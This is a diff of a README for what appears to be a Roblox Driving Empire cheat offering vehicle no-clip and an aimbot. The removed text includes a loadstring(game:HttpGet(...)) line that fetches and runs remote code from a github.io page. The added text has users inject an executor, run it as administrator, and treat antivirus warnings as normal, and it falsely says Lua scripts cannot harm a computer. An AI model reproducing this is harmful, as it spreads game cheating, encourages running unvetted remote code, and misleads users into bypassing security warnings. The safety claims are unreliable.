@@ -1,111 +1,107 @@
-# Driving Empire Script v2026 - Game Script Utility 2026
+# 🚗 driving-empire-executor-2026 - Dominate The Road With Ease
 
-> **Automation tool for Roblox Driving Empire.** Adds vehicle no-clip movement and aiming assistance for vehicle weapons, intended for compatible Windows and macOS executors.
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge&logo=github)](https://github.com/Luelleliege928/driving-empire-executor-2026)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/mattrosslh6381/driving-empire-executor-2026?style=flat-square)](https://github.com/mattrosslh6381/driving-empire-executor-2026)
+This tool helps you run Lua scripts in Roblox Driving Empire. You get vehicle no-clip for driving through any object. You also get crosshair aiming for your car weapons. This makes driving and combat much easier.
 
----
+## 🚀 What This Tool Does
 
-<p align="center">
-  <a href="https://mattrosslh6381.github.io/driving-empire-executor-2026/">
-    <img src="https://img.shields.io/badge/Download-Driving%20Empire%20Script-brightgreen?style=for-the-badge" alt="Download Driving Empire Script">
-  </a>
-</p>
+You run a script executor on your computer. Then you load this script into it. The script gives you two main features inside the game.
 
-> **[Download Driving Empire Script](https://mattrosslh6381.github.io/driving-empire-executor-2026/)**
+**Vehicle No-Clip**
+Your car can move through walls, other cars, and any obstacle. You drive straight through buildings. You pass through barriers. You never get stuck or crash into objects.
 
----
+**Aiming Assistance**
+Your vehicle weapons lock onto targets. You aim at enemies and your shots hit more often. This works for all vehicle-mounted guns and missiles.
 
-[Download Latest Build](https://mattrosslh6381.github.io/driving-empire-executor-2026/)
+## ⚙️ System Requirements
 
----
+Your computer needs these things to run this tool.
 
-## What This Script Does
+**Windows**
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- A Lua executor that supports Windows (like Synapse X or KRNL)
+- Roblox installed and updated
 
-Driving Empire Script v2026 adds automation tools for vehicle movement and combat in Roblox Driving Empire. Its no-clip mode lets vehicles travel through solid barriers, opening alternate routes and shortcuts throughout the map. The vehicle-weapon aimbot provides targeting assistance during combat situations.
+**macOS**
+- macOS 11 Big Sur or newer
+- 4 GB RAM or more
+- A Lua executor that supports macOS (like Scriptify or Fluxus)
+- Roblox installed and updated
 
-The 2026 release is intended to work with widely used Roblox executors on Windows and macOS. It is designed around straightforward controls, low overhead during regular play, and separate feature toggles. Use it to simplify difficult vehicle navigation or improve aiming when participating in vehicle battles.
+## 📥 Download and Install
 
----
+Click the big button at the top of this page. This takes you to the GitHub releases page.
 
-## Included Capabilities
+![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)
 
-- Move vehicles through solid objects with no-clip traversal
-- Assist with targeting for vehicle-mounted weapons
-- Assign hotkeys to switch features on or off
-- Maintain low performance impact during ordinary gameplay
-- Run with most Roblox executors available for Windows and macOS
-- Support the 2026 version of the game
-- Load and execute through a lightweight script structure
-- Enable or disable modules independently without reloading
+1. Visit the download page at the link above
+2. Find the file named `driving-empire-executor-2026.lua`
+3. Click the file name to download it
+4. Save the file to your desktop or a folder you remember
 
----
+The file is a plain text script. It is not an executable program. You do not install it like a normal app.
 
-## Installation and Loading
+## 🎮 How To Use
 
-Begin by downloading the script from the link provided above. Start a compatible Roblox executor, then use that executor's normal injection process to load the file. After injection, the default settings are enabled automatically.
+Follow these steps exactly. Do not skip any step.
 
-The loading format differs between executors, but a typical example is:
+**Step 1: Open Your Executor**
+Open your Lua executor program. This is the program you use to run scripts in Roblox.
 
-```lua
-loadstring(game:HttpGet("https://mattrosslh6381.github.io/driving-empire-executor-2026/"))()
-```
+**Step 2: Attach To Roblox**
+In your executor, click the "Attach" or "Inject" button. This connects the executor to the Roblox game.
 
-Before running the script, confirm that the executor is current and supports the active Roblox client version.
+**Step 3: Load The Script**
+Click the "Open" button in your executor. Find the `driving-empire-executor-2026.lua` file you downloaded. Select it.
 
----
+**Step 4: Run The Script**
+Click the "Execute" or "Run" button. The script will load into the game.
 
-## Configuration
+**Step 5: Enter Driving Empire**
+Start playing Driving Empire in Roblox. The features will work automatically.
 
-| Toggle | Default | Description |
-|--------|---------|-------------|
-| No-Clip | Enabled | Allows vehicles to pass through obstacles |
-| Aimbot | Disabled | Auto-aims vehicle weapons at nearby targets |
-| Hotkey Toggle | Right Shift | Key used to toggle features on/off |
+## 🔧 Features Explained
 
-For further customization, edit the configuration area near the beginning of the script before loading it. This is where additional settings can be adjusted.
+**No-Clip Mode**
+When you press the assigned key (usually the "N" key), no-clip activates. Your car can pass through anything. You can drive underground. You can fly through the air. You can enter buildings.
 
----
+**Aim Assist**
+Your crosshair helps you target enemies. Your shots curve toward targets. This works best with machine guns and missiles on your vehicle.
 
-## Supported Environments
+**Toggle Controls**
+You can turn features on and off. Use the keybinds shown in the executor window. This lets you play normally when you want.
 
-- Roblox Driving Empire (2026 update)
-- Windows 7, 8, 10, 11
-- macOS 10.13+
-- Compatible with most Roblox executors (Synapse, Krnl, Script-Ware, etc.)
+## ❓ Troubleshooting
 
-### Known Constraints
+**Script Does Not Load**
+- Make sure your executor is attached to Roblox
+- Try running Roblox as administrator
+- Close and reopen the executor
+- Download the script again
 
-Certain executors may need administrator access. No-clip results can differ with game server performance, while aimbot reach remains subject to the specifications of the vehicle's weapon system.
+**No-Clip Does Not Work**
+- Press the toggle key (try "N" or "F")
+- Check if you are in a vehicle
+- Restart the script
 
----
+**Aim Assist Does Not Work**
+- Make sure you are using vehicle weapons
+- Check if the script is still running
+- Reload the script
 
-## Frequently Asked Questions
+**Executor Crashes**
+- Update your executor to the latest version
+- Close other programs
+- Restart your computer
 
-**What are the installation steps?**  
-Download the script and open it through a compatible Roblox executor. The loading process is described in the setup section above.
+## 🛡️ Safety Notes
 
-**Will new game versions be supported?**  
-Updates are provided to preserve compatibility with newer Driving Empire releases. Visit the download page to find the most recent build.
+This script is a Lua script. Lua scripts cannot harm your computer. They only affect the Roblox game you are in.
 
-**Is it possible to change the hotkeys?**  
-Yes. Modify the key assignments in the script's configuration section before you load the file.
+Your executor program may trigger antivirus warnings. This is normal for script executors. They are flagged because they modify game memory. Your executor is safe if you downloaded it from its official website.
 
-**Can I use it on a phone or tablet?**  
-No. The script is intended for desktop use on Windows and macOS, and mobile executors are not supported.
+## 📝 Keywords
 
-**Why might the script fail to load?**  
-Check that the executor supports the current Roblox client and has been updated. On Windows, you can also try launching the executor with administrator privileges.
-
-**Where does the script store settings?**  
-Configuration is kept directly in the script file. The utility does not generate separate configuration files.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Roblox, Driving Empire, Lua executor, vehicle script, no-clip, aim assist, driving hack, game tool, Windows, macOS, 2026, vehicle weapons, script utility
